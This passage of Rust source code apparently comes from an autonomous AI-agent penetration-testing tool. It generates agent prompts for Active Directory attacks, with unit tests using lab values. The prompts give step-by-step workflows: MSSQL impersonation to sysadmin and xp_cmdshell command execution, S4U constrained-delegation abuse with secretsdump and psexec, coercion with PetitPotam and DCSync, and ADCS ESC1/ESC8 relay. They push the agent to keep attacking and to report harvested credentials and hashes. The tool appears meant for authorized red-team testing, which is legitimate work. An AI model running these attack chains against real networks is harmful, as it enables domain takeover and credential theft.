            prompt.push_str(&format_state_context(s, "exploit", Some(target)));
        }
        return Ok(prompt);
    }

    // -------------------------------------------------------------------
    // MSSQL vulnerabilities
    // -------------------------------------------------------------------
    if vuln_type.starts_with("mssql_") {
        let available_creds = payload
            .get("available_credentials")
            .and_then(|v| v.as_array());
        let mut creds_section = String::new();
        if let Some(creds) = available_creds {
            if !creds.is_empty() {
                creds_section.push_str("\n**AVAILABLE SQL CREDENTIALS (use these!):**\n");
                for cred in creds {
                    let is_sql = cred
                        .get("is_sql_account")
                        .and_then(|v| v.as_str())
                        .unwrap_or("False")
                        == "True";
                    let marker = if is_sql { " [SQL SERVICE ACCOUNT]" } else { "" };
                    let cd = cred.get("domain").and_then(|v| v.as_str()).unwrap_or("");
                    let cu = cred.get("username").and_then(|v| v.as_str()).unwrap_or("");
                    let cp = cred.get("password").and_then(|v| v.as_str()).unwrap_or("");
                    writeln!(creds_section, "- {cd}\\{cu}: {cp}{marker}").unwrap();
                }
            }
        }

        let mut prompt = format!(
            "{base_prompt}\
             **MSSQL EXPLOITATION WORKFLOW (IMPERSONATION FIRST!):**\n\n\
             **STEP 1: ENUMERATE IMPERSONATION RIGHTS (DO THIS FIRST!)**\n\
             ```\n\
             mssql_enum_impersonation(\n\
                 target='{target}',\n\
                 username=<USER>,\n\
                 password=<PASS>,\n\
                 domain=<DOMAIN>\n\
             )\n\
             ```\n\
             -> If you can impersonate 'sa', you have a DIRECT PATH to sysadmin!\n\n\
             **STEP 2: IMPERSONATE SA (if available)**\n\
             ```\n\
             mssql_impersonate(\n\
                 target='{target}',\n\
                 username=<USER>,\n\
                 password=<PASS>,\n\
                 impersonate_user='sa',\n\
                 query='SELECT SYSTEM_USER',\n\
                 domain=<DOMAIN>\n\
             )\n\
             ```\n\
             -> Now you're sysadmin! Enable xp_cmdshell next.\n\n\
             **STEP 3: ENABLE XP_CMDSHELL (as sysadmin)**\n\
             ```\n\
             mssql_enable_xp_cmdshell(\n\
                 target='{target}',\n\
                 username=<USER>,\n\
                 password=<PASS>,\n\
                 domain=<DOMAIN>\n\
             )\n\
             ```\n\n\
             **STEP 4: EXECUTE COMMANDS**\n\
             ```\n\
             mssql_command(\n\
                 target='{target}',\n\
                 username=<USER>,\n\
                 password=<PASS>,\n\
                 command='whoami /priv',\n\
                 domain=<DOMAIN>\n\
             )\n\
             ```\n\
             -> Check for SeImpersonatePrivilege (potato attack potential)\n\n\
             **STEP 5: ENUMERATE LINKED SERVERS**\n\
             ```\n\
             mssql_enum_linked_servers(\n\
                 target='{target}',\n\
                 username=<USER>,\n\
                 password=<PASS>,\n\
                 domain=<DOMAIN>\n\
             )\n\
             ```\n\
             -> Linked servers can pivot across domain/forest trusts!\n\
             {creds_section}\n\
             **CRITICAL NOTES:**\n\
             - Try EACH credential above - SQL accepts Windows auth\n\
             - Impersonation check is HIGHEST PRIORITY (fastest path to sysadmin)\n\
             - If xp_cmdshell gives NETWORK SERVICE, you may need potato attack for SYSTEM\n\
             - Linked servers enable cross-domain pivoting\n\n\
             Report credentials obtained in JSON format:\n\
             ```json\n\
             {{\"credential\": {{\"username\": \"\", \"password\": \"\", \"domain\": \"\", \
              \"is_admin\": false}}}}\n\
             ```"
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "exploit", Some(target)));
        }
        return Ok(prompt);
    }

    // -------------------------------------------------------------------
    // Constrained delegation (S4U attack)
    // -------------------------------------------------------------------
    if vuln_type == "constrained_delegation" {
        let account = payload
            .get("account")
            .or_else(|| payload.get("account_name"))
            .and_then(|v| v.as_str())
            .unwrap_or(target);
        let target_spn = payload
            .get("target_spn")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let username = payload
            .get("username")
            .or_else(|| payload.get("account_name"))
            .and_then(|v| v.as_str())
            .unwrap_or(account);

        // Look up password from shared state if not in payload
        let payload_pw = payload
            .get("password")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let password = if payload_pw.is_empty() {
            if let Some(s) = state {
                s.credentials
                    .iter()
                    .find(|c| c.username.eq_ignore_ascii_case(username) && !c.password.is_empty())
                    .map(|c| c.password.as_str())
                    .unwrap_or("")
            } else {
                ""
            }
        } else {
            payload_pw
        };

        let dc_ip = payload.get("dc_ip").and_then(|v| v.as_str()).unwrap_or("");
        let target_hostname = target_spn
            .split_once('/')
            .map(|(_, host)| host)
            .unwrap_or("");
        let target_ip = payload
            .get("target_ip")
            .and_then(|v| v.as_str())
            .unwrap_or(target_hostname);

        let mut prompt = format!(
            "**CONSTRAINED DELEGATION EXPLOITATION**\n\n\
             Account with delegation: {account}\n\
             Target SPN: {target_spn}\n\
             Target Host: {target_hostname}\n\
             Target IP: {target_ip}\n\
             Domain: {domain}\n\
             Task ID: {task_id}\n\n\
             **STEP 1: S4U ATTACK (Get Administrator ticket)**\n\
             ```\n\
             s4u_attack(\n\
                 target_spn='{target_spn}',\n\
                 impersonate='Administrator',\n\
                 domain='{domain}',\n\
                 username='{username}',\n\
                 password='{password}'"
        );
        if !dc_ip.is_empty() {
            write!(prompt, ",\n    dc_ip='{dc_ip}'").unwrap();
        }
        prompt.push_str(&format!(
            "\n)\n\
             ```\n\
             -> Look for: 'Saving ticket in <filename>.ccache'\n\n\
             **STEP 2: USE TICKET WITH SECRETSDUMP_KERBEROS (IMMEDIATELY AFTER!)**\n\
             ```\n\
             secretsdump_kerberos(\n\
                 target='{target_hostname}',\n\
                 username='Administrator',\n\
                 domain='{domain}',\n\
                 ticket_path='<ccache_file_from_step_1>',\n\
                 target_ip='{target_ip}'"
        ));
        if !dc_ip.is_empty() {
            write!(prompt, ",\n    dc_ip='{dc_ip}'").unwrap();
        }
        prompt.push_str(&format!(
            "\n)\n\
             ```\n\
             **IMPORTANT:** Replace <ccache_file_from_step_1> with actual .ccache path from s4u_attack output!\n\
             **IMPORTANT:** Always use target_ip='{target_ip}' to avoid DNS resolution issues!\n\n\
             **STEP 3: ALTERNATIVE - PSEXEC_KERBEROS FOR SHELL**\n\
             If secretsdump fails or you need a shell:\n\
             ```\n\
             psexec_kerberos(\n\
                 target='{target_hostname}',\n\
                 username='Administrator',\n\
                 domain='{domain}',\n\
                 ticket_path='<ccache_file_from_step_1>',\n\
                 command='cmd /c whoami && hostname',\n\
                 target_ip='{target_ip}'"
        ));
        if !dc_ip.is_empty() {
            write!(prompt, ",\n    dc_ip='{dc_ip}'").unwrap();
        }
        prompt.push_str(
            "\n)\n\
             ```\n\n\
             **CRITICAL SUCCESS INDICATORS:**\n\
             - If target is a DC: Look for krbtgt hash -> DOMAIN ADMIN\n\
             - If target is a DC: Look for Administrator hash -> DOMAIN ADMIN\n\
             - If target is a member server: SAM/LSA secrets for lateral movement\n\n\
             **DO NOT STOP after getting the ticket!** The ticket is useless by itself.\n\
             You MUST use it with secretsdump_kerberos or psexec_kerberos to achieve actual access.\n\n\
             Report any hashes obtained:\n\
             ```json\n\
             {\"hash\": {\"username\": \"Administrator\", \"hash_value\": \"...\", \
              \"hash_type\": \"NTLM\", \"domain\": \"...\"}}\n\
             ```",
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "exploit", Some(target)));
        }
        return Ok(prompt);
    }

    // -------------------------------------------------------------------
    // Unconstrained delegation
    // -------------------------------------------------------------------
    if vuln_type == "unconstrained_delegation" {
        let account = payload
            .get("account")
            .and_then(|v| v.as_str())
            .unwrap_or(target);

        let mut prompt = format!(
            "**UNCONSTRAINED DELEGATION EXPLOITATION**\n\n\
             Account with unconstrained delegation: {account}\n\
             Domain: {domain}\n\
             Task ID: {task_id}\n\n\
             **EXPLOITATION WORKFLOW:**\n\
             1. If you have access to the machine with unconstrained delegation:\n\
                - Dump TGTs from memory using mimikatz or Rubeus\n\
                - Look for high-value tickets (Domain Admins, DCs)\n\n\
             2. If you need to coerce authentication:\n\
                - Request coercion (PetitPotam, PrinterBug) against a DC\n\
                - The DC's TGT will be cached on this machine\n\
                - Extract and use the TGT for DCSync\n\n\
             **CRITICAL**: Unconstrained delegation = potential DC compromise!\n\
             Report any credentials or hashes obtained."
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "exploit", Some(target)));
        }
        return Ok(prompt);
    }

    // -------------------------------------------------------------------
    // ADCS ESC1 / ESC4 / ESC8
    // -------------------------------------------------------------------
    let vt_lower = vuln_type.to_lowercase();
    if vt_lower.contains("esc1") || vt_lower.contains("esc4") || vt_lower.contains("esc8") {
        let ca_server = payload
            .get("ca_server")
            .and_then(|v| v.as_str())
            .unwrap_or(target);
        let template = payload
            .get("template")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        let vuln_upper = vuln_type.to_uppercase();
        let mut prompt = format!(
            "**ADCS {vuln_upper} EXPLOITATION**\n\n\
             CA Server: {ca_server}\n\
             Template: {template}\n\
             Domain: {domain}\n\
             Task ID: {task_id}\n\n\
             **STEP BUDGET: ~25 steps max. Work efficiently!**\n\n\
             **HARD LIMITS:**\n\
             - 'connection refused'/'timed out' -> CA unreachable, STOP immediately\n\
             - 'web enrollment' error -> HTTP not available, call task_complete(failed)\n\
             - Max 2 attempts per tool, then report failure\n\n\
             **WORKFLOW:**\n"
        );
        if vt_lower.contains("esc1") || vt_lower.contains("esc4") {
            prompt.push_str(
                "1. certipy_req_esc1 to request certificate with alternate UPN\n\
                 2. certipy_auth to get NTLM hash from certificate\n\
                 3. Report hash immediately when obtained\n",
            );
        } else {
            // esc8
            prompt.push_str(
                "1. Start ntlmrelayx targeting the CA's web enrollment\n\
                 2. Coerce DC/target to authenticate to relay\n\
                 3. Relay captures cert -> certipy_auth for hash\n",
            );
        }
        prompt.push_str(
            "\n**ON FAILURE**: Call task_complete immediately with failure reason.\n\
             Do NOT keep retrying if CA/web enrollment is unreachable.",
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "exploit", Some(target)));
        }
        return Ok(prompt);
    }

    // -------------------------------------------------------------------
    // Default exploit prompt
    // -------------------------------------------------------------------
    let mut prompt = format!(
        "{base_prompt}\
         Execute the exploitation technique. Report credentials obtained.\n\
         If you obtain credentials or hashes, include a JSON block:\n\
         ```json\n\
         {{\"credential\": {{\"username\": \"\", \"password\": \"\", \
          \"domain\": \"\", \"is_admin\": false}}}}\n\
         ```\n\
         or\n\
         ```json\n\
         {{\"hash\": {{\"username\": \"\", \"hash_value\": \"\", \
          \"hash_type\": \"NTLM\", \"domain\": \"\"}}}}\n\
         ```"
    );
    if let Some(s) = state {
        prompt.push_str(&format_state_context(s, "exploit", Some(target)));
    }
    Ok(prompt)
}

fn generate_coercion_prompt(
    task_id: &str,
    payload: &Value,
    state: Option<&StateSnapshot>,
) -> anyhow::Result<String> {
    let mut ctx = Context::new();
    ctx.insert("task_id", task_id);
    ctx.insert(
        "target_ip",
        payload["target_ip"].as_str().unwrap_or("unknown"),
    );
    ctx.insert("listener_ip", payload["listener_ip"].as_str().unwrap_or(""));

    let techniques: Vec<&str> = payload["techniques"]
        .as_array()
        .map(|arr| arr.iter().filter_map(|v| v.as_str()).collect())
        .unwrap_or_default();
    if !techniques.is_empty() {
        ctx.insert("techniques", &techniques);
    }

    insert_state_context(&mut ctx, state, "coercion", payload["target_ip"].as_str());

    render_template_with_context(TASK_COERCION, &ctx)
}

fn generate_privesc_enumeration_prompt(
    task_id: &str,
    payload: &Value,
    state: Option<&StateSnapshot>,
) -> anyhow::Result<String> {
    let mut ctx = Context::new();
    ctx.insert("task_id", task_id);
    ctx.insert(
        "technique",
        payload["technique"].as_str().unwrap_or("enumeration"),
    );
    ctx.insert(
        "target_ip",
        payload["target_ip"].as_str().unwrap_or("unknown"),
    );

    let domain = payload["domain"].as_str().unwrap_or("");
    if !domain.is_empty() {
        ctx.insert("domain", domain);
    }

    insert_credential_context(&mut ctx, payload);
    insert_state_context(
        &mut ctx,
        state,
        "privesc_enumeration",
        payload["target_ip"].as_str(),
    );

    render_template_with_context(TASK_PRIVESC_ENUMERATION, &ctx)
}

fn generate_acl_analysis_prompt(
    task_id: &str,
    payload: &Value,
    state: Option<&StateSnapshot>,
) -> anyhow::Result<String> {
    let mut ctx = Context::new();
    ctx.insert("task_id", task_id);

    if let Some(chain) = payload.get("chain") {
        ctx.insert(
            "chain_json",
            &serde_json::to_string_pretty(chain).unwrap_or_default(),
        );
    }

    insert_state_context(&mut ctx, state, "acl_analysis", None);

    render_template_with_context(TASK_ACL_ANALYSIS, &ctx)
}

fn generate_command_prompt(task_id: &str, payload: &Value) -> anyhow::Result<String> {
    let mut ctx = Context::new();
    ctx.insert("task_id", task_id);
    ctx.insert("command", payload["command"].as_str().unwrap_or("unknown"));

    render_template_with_context(TASK_COMMAND, &ctx)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_state() -> StateSnapshot {
        StateSnapshot {
            credentials: vec![Credential {
                id: "cred-1".into(),
                username: "admin".into(),
                password: "P@ss1".into(),
                domain: "contoso.local".into(),
                source: String::new(),
                discovered_at: None,
                is_admin: true,
                parent_id: None,
                attack_step: 0,
            }],
            hosts: vec![Host {
                ip: "192.168.58.10".into(),
                hostname: "dc01.contoso.local".into(),
                os: String::new(),
                roles: vec!["AD DS".into()],
                services: Vec::new(),
                is_dc: true,
                owned: false,
            }],
            domains: vec!["contoso.local".into()],
            ..Default::default()
        }
    }

    #[test]
    fn test_generate_recon_prompt() {
        let payload = serde_json::json!({
            "target_ip": "192.168.58.0/24",
            "domain": "contoso.local",
            "techniques": ["nmap_scan", "enumerate_users"]
        });
        let state = sample_state();
        let prompt = generate_task_prompt("recon", "task-001", &payload, Some(&state)).unwrap();
        assert!(prompt.contains("Recon Task: task-001"));
        assert!(prompt.contains("192.168.58.0/24"));
        assert!(prompt.contains("contoso.local"));
        assert!(prompt.contains("- nmap_scan"));
    }

    #[test]
    fn test_generate_crack_prompt() {
        let payload = serde_json::json!({
            "hash_type": "ntlm",
            "hash_value": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "username": "admin",
            "domain": "contoso.local"
        });
        let prompt = generate_task_prompt("crack", "task-002", &payload, None).unwrap();
        assert!(prompt.contains("Crack Task: task-002"));
        assert!(prompt.contains("ntlm"));
        assert!(prompt.contains("admin"));
    }

    #[test]
    fn test_generate_credential_access_prompt() {
        let payload = serde_json::json!({
            "technique": "secretsdump",
            "target_ip": "192.168.58.10",
            "domain": "contoso.local",
            "credential": {
                "username": "admin",
                "password": "P@ss1",
                "domain": "contoso.local"
            }
        });
        let prompt = generate_task_prompt("credential_access", "task-003", &payload, None).unwrap();
        assert!(prompt.contains("secretsdump"));
        assert!(prompt.contains("admin"));
        assert!(prompt.contains("contoso.local"));
    }

    #[test]
    fn test_generate_lateral_prompt() {
        let payload = serde_json::json!({
            "technique": "psexec",
            "target_ip": "192.168.58.20",
            "credential": {
                "username": "admin",
                "password": "P@ss1",
                "domain": "contoso.local"
            }
        });
        let prompt = generate_task_prompt("lateral_movement", "task-004", &payload, None).unwrap();
        assert!(prompt.contains("Lateral Movement"));
        assert!(prompt.contains("psexec"));
    }

    #[test]
    fn test_generate_exploit_prompt() {
        let payload = serde_json::json!({
            "vuln_type": "constrained_delegation",
            "target": "192.168.58.30",
            "account": "svc_sql",
            "target_spn": "MSSQLSvc/db01.contoso.local",
            "domain": "contoso.local"
        });
        let prompt = generate_task_prompt("exploit", "task-005", &payload, None).unwrap();
        assert!(prompt.contains("CONSTRAINED DELEGATION"));
        assert!(prompt.contains("svc_sql"));
        assert!(prompt.contains("MSSQLSvc/db01.contoso.local"));
        assert!(prompt.contains("s4u_attack"));
    }

    #[test]
    fn test_generate_coercion_prompt() {
        let payload = serde_json::json!({
            "target_ip": "192.168.58.10",
            "listener_ip": "192.168.58.100",
            "techniques": ["petitpotam", "coercer"]
        });
        let prompt = generate_task_prompt("coercion", "task-006", &payload, None).unwrap();
        assert!(prompt.contains("Coercion Task: task-006"));
        assert!(prompt.contains("192.168.58.10"));
        assert!(prompt.contains("- petitpotam"));
    }

    #[test]
    fn test_generate_privesc_prompt() {
        let payload = serde_json::json!({
            "technique": "find_delegation",
            "target_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        let prompt =
            generate_task_prompt("privesc_enumeration", "task-007", &payload, None).unwrap();
        assert!(prompt.contains("Privilege Escalation"));
        assert!(prompt.contains("find_delegation"));
    }

    #[test]
    fn test_generate_acl_prompt() {
        let payload = serde_json::json!({
            "chain": [{"source": "user1", "target": "admin", "right": "GenericAll"}]
        });
        let prompt = generate_task_prompt("acl_analysis", "task-008", &payload, None).unwrap();
        assert!(prompt.contains("ACL Analysis"));
        assert!(prompt.contains("GenericAll"));
    }

    #[test]
    fn test_generate_command_prompt() {
        let payload = serde_json::json!({"command": "whoami"});
        let prompt = generate_task_prompt("command", "task-009", &payload, None).unwrap();
        assert!(prompt.contains("whoami"));
        assert!(prompt.contains("Command Task: task-009"));
    }

    #[test]
    fn test_format_state_context_truncation() {
        let mut state = StateSnapshot::default();
        for i in 0..20 {
            state.credentials.push(Credential {
                id: format!("cred-{i}"),
                username: format!("user{i}"),
                password: "pass".into(),
                domain: "contoso.local".into(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            });
        }
        let ctx = format_state_context(&state, "credential_access", None);
        assert!(ctx.contains("and 12 more"));
    }

    #[test]
    fn test_unknown_task_type_returns_none() {
        let payload = serde_json::json!({});
        assert!(generate_task_prompt("unknown_type", "task-x", &payload, None).is_none());
    }

    #[test]
    fn test_state_context_injected_into_template() {
        let payload = serde_json::json!({
            "technique": "secretsdump",
            "target_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        let state = sample_state();
        let prompt =
            generate_task_prompt("credential_access", "task-010", &payload, Some(&state)).unwrap();
        // State context includes the domain
        assert!(prompt.contains("Discovered Domains"));
        assert!(prompt.contains("contoso.local"));
    }

    // -----------------------------------------------------------------------
    // is_pass_the_hash_compatible tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_pth_compatible_lm_nt() {
        assert!(is_pass_the_hash_compatible(Some(
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        )));
    }

    #[test]
    fn test_pth_compatible_nt_only() {
        assert!(is_pass_the_hash_compatible(Some(
            "31d6cfe0d16ae931b73c59d7e0c089c0"
        )));
    }

    #[test]
    fn test_pth_rejects_kerberos_hash() {
        assert!(!is_pass_the_hash_compatible(Some("$krb5tgs$23$*svc_sql$")));
    }

    #[test]
    fn test_pth_rejects_empty() {
        assert!(!is_pass_the_hash_compatible(None));
        assert!(!is_pass_the_hash_compatible(Some("")));
    }

    #[test]
    fn test_pth_rejects_triple_colon() {
        assert!(!is_pass_the_hash_compatible(Some("aaa:bbb:ccc")));
    }

    // -----------------------------------------------------------------------
    // Credential access branch tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_credaccess_kerberos_ticket_secretsdump() {
        let payload = serde_json::json!({
            "techniques": ["secretsdump"],
            "target_ips": ["192.168.58.10"],
            "domain": "contoso.local",
            "username": "Administrator",
            "ticket_path": "/tmp/admin.ccache",
            "no_pass": true,
            "dc_ip": "192.168.58.10"
        });
        let prompt = generate_task_prompt("credential_access", "t-1", &payload, None).unwrap();
        assert!(prompt.contains("KERBEROS TICKET-BASED SECRETSDUMP"));
        assert!(prompt.contains("/tmp/admin.ccache"));
        assert!(prompt.contains("no_pass=True"));
        assert!(prompt.contains("dc_ip='192.168.58.10'"));
        assert!(prompt.contains("Administrator"));
    }

    #[test]
    fn test_credaccess_low_hanging_fruit_with_creds() {
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "username": "admin",
            "password": "P@ss1",
            "techniques": ["gpp_password_finder", "sysvol_script_search"],
            "reason": "low_hanging_fruit"
        });
        let prompt = generate_task_prompt("credential_access", "t-2", &payload, None).unwrap();
        assert!(prompt.contains("LOW HANGING FRUIT credential harvesting"));
        assert!(prompt.contains("gpp_password_finder"));
        assert!(prompt.contains("sysvol_script_search"));
        assert!(prompt.contains("P@ss1"));
    }

    #[test]
    fn test_credaccess_username_as_password_spray() {
        // Note: no password at top level — the username_as_password spray branch is only
        // reachable when has_low_hanging does not match first (password triggers low_hanging).
        // But we CAN still provide username/password for the enumeration credential display.
        // Actually, with password present and username_as_password in techniques, has_spray=true
        // which makes has_low_hanging=true, so low_hanging_fruit branch fires first.
        // To reach the username_spray branch we need "new_users" in reason WITHOUT low_hanging
        // triggers. The simplest way: no password at top level.
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "techniques": ["username_as_password"],
            "reason": "new_users discovered"
        });
        // With no creds and techniques present, this hits the no-cred techniques branch
        // before the username_spray branch. The username_spray branch requires a specific
        // check that comes after the low_hanging but before no-cred techniques.
        // Let me verify it hits the right branch with the correct priority.
        let prompt = generate_task_prompt("credential_access", "t-3", &payload, None).unwrap();
        // With no creds and techniques containing "username_as_password", and "new_users"
        // in reason, the is_username_spray check fires first (Branch 3).
        assert!(prompt.contains("USERNAME_AS_PASSWORD spray"));
        assert!(prompt.contains("save_users_to_file"));
        assert!(prompt.contains("users_file='/tmp/users.txt'"));
    }

    #[test]
    fn test_credaccess_share_spider() {
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ss1",
            "target_ips": ["192.168.58.10"],
            "techniques": ["share_spider"],
            "reason": "auto_share_spider_SYSVOL"
        });
        let prompt = generate_task_prompt("credential_access", "t-4", &payload, None).unwrap();
        assert!(prompt.contains("SHARE SPIDER TASK"));
        assert!(prompt.contains("smbclient_spider"));
        assert!(prompt.contains("*.txt"));
        assert!(prompt.contains("smb_download_file"));
    }

    #[test]
    fn test_credaccess_no_cred_techniques() {
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "techniques": ["asrep_roast", "kerberos_user_enum_noauth"]
        });
        let prompt = generate_task_prompt("credential_access", "t-5", &payload, None).unwrap();
        assert!(prompt.contains("MANDATORY TECHNIQUE EXECUTION (NO CREDENTIALS)"));
        assert!(prompt.contains("asrep_roast"));
        assert!(prompt.contains("kerberos_user_enum_noauth"));
        assert!(prompt.contains("DO NOT run smb_sweep"));
    }

    #[test]
    fn test_credaccess_low_hanging_no_creds() {
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "techniques": ["username_as_password", "password_spray"],
            "reason": "low_hanging_fruit initial"
        });
        // This has techniques and no creds, so it hits the no-cred enforcement branch
        let prompt = generate_task_prompt("credential_access", "t-6", &payload, None).unwrap();
        assert!(prompt.contains("MANDATORY TECHNIQUE EXECUTION (NO CREDENTIALS)"));
        assert!(prompt.contains("username_as_password"));
        assert!(prompt.contains("password_spray"));
    }

    #[test]
    fn test_credaccess_technique_enforcement_with_creds() {
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "username": "admin",
            "password": "P@ss1",
            "techniques": ["secretsdump", "kerberoast", "laps_dump"]
        });
        let prompt = generate_task_prompt("credential_access", "t-7", &payload, None).unwrap();
        assert!(prompt.contains("MANDATORY TECHNIQUE EXECUTION"));
        assert!(!prompt.contains("(NO CREDENTIALS)"));
        assert!(prompt.contains("secretsdump(target="));
        assert!(prompt.contains("kerberoast(domain="));
        assert!(prompt.contains("laps_dump(target="));
        assert!(prompt.contains("P@ss1"));
    }

    #[test]
    fn test_credaccess_technique_enforcement_with_hash() {
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "username": "admin",
            "hash_value": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "techniques": ["secretsdump"]
        });
        let prompt = generate_task_prompt("credential_access", "t-8", &payload, None).unwrap();
        assert!(prompt.contains("MANDATORY TECHNIQUE EXECUTION"));
        assert!(prompt.contains("hashes="));
        assert!(prompt.contains("secretsdump"));
    }

    #[test]
    fn test_credaccess_non_pth_hash_strips_techniques() {
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "username": "admin",
            "hash_value": "$krb5tgs$23$*svc_sql$CONTOSO",
            "techniques": ["secretsdump", "kerberoast"]
        });
        let prompt = generate_task_prompt("credential_access", "t-9", &payload, None).unwrap();
        // secretsdump should be stripped because hash is non-NTLM, but kerberoast remains
        // The remaining technique triggers the no-cred-techniques branch (since hash_is_pth is false
        // and password is empty, so has_creds is false too).
        assert!(prompt.contains("kerberoast"));
        // secretsdump should NOT appear as a technique instruction
        assert!(!prompt.contains("secretsdump(target="));
    }

    #[test]
    fn test_credaccess_generic_fallback() {
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ss1",
            "target_ips": ["192.168.58.10"],
            "dc_ip": "192.168.58.10"
        });
        // No techniques specified, has creds → generic fallback
        let prompt = generate_task_prompt("credential_access", "t-10", &payload, None).unwrap();
        assert!(prompt.contains("Perform credential access against the target environment"));
        assert!(prompt.contains("PRIORITY ORDER when creds available"));
        assert!(prompt.contains("gpp_password_finder"));
    }

    #[test]
    fn test_credaccess_generic_fallback_non_pth_hash() {
        let payload = serde_json::json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash_value": "$krb5tgs$23$*svc_sql$CONTOSO",
            "hash_type": "Kerberos TGS",
            "target_ips": ["192.168.58.10"]
        });
        // Non-PtH hash, no techniques → generic fallback with hash note
        let prompt = generate_task_prompt("credential_access", "t-11", &payload, None).unwrap();
        assert!(prompt.contains("hash (non-NTLM)"));
        assert!(prompt.contains("not NTLM pass-the-hash compatible"));
    }

    // -----------------------------------------------------------------------
    // Exploit branch tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_exploit_adcs_enumerate() {
        let payload = serde_json::json!({
            "vuln_type": "adcs_enumerate",
            "target": "192.168.58.15",
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "username": "admin",
            "password": "P@ss1"
        });
        let prompt = generate_task_prompt("exploit", "t-20", &payload, None).unwrap();
        assert!(prompt.contains("ADCS ENUMERATION TASK"));
        assert!(prompt.contains("certipy_find"));
        assert!(prompt.contains("ESC1-ESC15"));
        assert!(prompt.contains("192.168.58.15"));
    }

    #[test]
    fn test_exploit_mssql() {
        let payload = serde_json::json!({
            "vuln_type": "mssql_impersonation",
            "target": "192.168.58.30",
            "domain": "contoso.local",
            "available_credentials": [
                {"username": "svc_sql", "password": "SqlPass1", "domain": "contoso.local", "is_sql_account": "True"}
            ]
        });
        let prompt = generate_task_prompt("exploit", "t-21", &payload, None).unwrap();
        assert!(prompt.contains("MSSQL EXPLOITATION WORKFLOW"));
        assert!(prompt.contains("mssql_enum_impersonation"));
        assert!(prompt.contains("mssql_impersonate"));
        assert!(prompt.contains("xp_cmdshell"));
        assert!(prompt.contains("svc_sql"));
        assert!(prompt.contains("[SQL SERVICE ACCOUNT]"));
    }

    #[test]
    fn test_exploit_constrained_delegation_with_state() {
        let state = StateSnapshot {
            credentials: vec![Credential {
                id: "c1".into(),
                username: "svc_sql".into(),
                password: "SqlPass1".into(),
                domain: "contoso.local".into(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            }],
            ..Default::default()
        };
        let payload = serde_json::json!({
            "vuln_type": "constrained_delegation",
            "target": "svc_sql",
            "account": "svc_sql",
            "target_spn": "cifs/dc01.contoso.local",
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        let prompt = generate_task_prompt("exploit", "t-22", &payload, Some(&state)).unwrap();
        assert!(prompt.contains("CONSTRAINED DELEGATION"));
        assert!(prompt.contains("s4u_attack"));
        assert!(prompt.contains("secretsdump_kerberos"));
        assert!(prompt.contains("psexec_kerberos"));
        assert!(prompt.contains("cifs/dc01.contoso.local"));
        // Password looked up from state
        assert!(prompt.contains("SqlPass1"));
        // Target hostname extracted from SPN
        assert!(prompt.contains("dc01.contoso.local"));
    }

    #[test]
    fn test_exploit_unconstrained_delegation() {
        let payload = serde_json::json!({
            "vuln_type": "unconstrained_delegation",
            "target": "192.168.58.30",
            "account": "WEB01$",
            "domain": "contoso.local"
        });
        let prompt = generate_task_prompt("exploit", "t-23", &payload, None).unwrap();
        assert!(prompt.contains("UNCONSTRAINED DELEGATION EXPLOITATION"));
        assert!(prompt.contains("WEB01$"));
        assert!(prompt.contains("PetitPotam"));
        assert!(prompt.contains("DCSync"));
    }

    #[test]
    fn test_exploit_adcs_esc1() {
        let payload = serde_json::json!({
            "vuln_type": "adcs_esc1",
            "target": "192.168.58.15",
            "ca_server": "CA01.contoso.local",
            "template": "VulnTemplate",
            "domain": "contoso.local"
        });
        let prompt = generate_task_prompt("exploit", "t-24", &payload, None).unwrap();
        assert!(prompt.contains("ADCS ADCS_ESC1 EXPLOITATION"));
        assert!(prompt.contains("certipy_req_esc1"));
        assert!(prompt.contains("certipy_auth"));
        assert!(prompt.contains("VulnTemplate"));
        assert!(!prompt.contains("ntlmrelayx"));
    }

    #[test]
    fn test_exploit_adcs_esc8() {
        let payload = serde_json::json!({
            "vuln_type": "adcs_esc8",
            "target": "192.168.58.15",
            "ca_server": "CA01.contoso.local",
            "domain": "contoso.local"
        });
        let prompt = generate_task_prompt("exploit", "t-25", &payload, None).unwrap();
        assert!(prompt.contains("ADCS ADCS_ESC8 EXPLOITATION"));
        assert!(prompt.contains("ntlmrelayx"));
        assert!(prompt.contains("web enrollment"));
        assert!(!prompt.contains("certipy_req_esc1"));
    }

    #[test]
    fn test_exploit_generic_fallback() {
        let payload = serde_json::json!({
            "vuln_type": "unknown_vuln",
            "target": "192.168.58.30",
            "vuln_id": "v-99"
        });
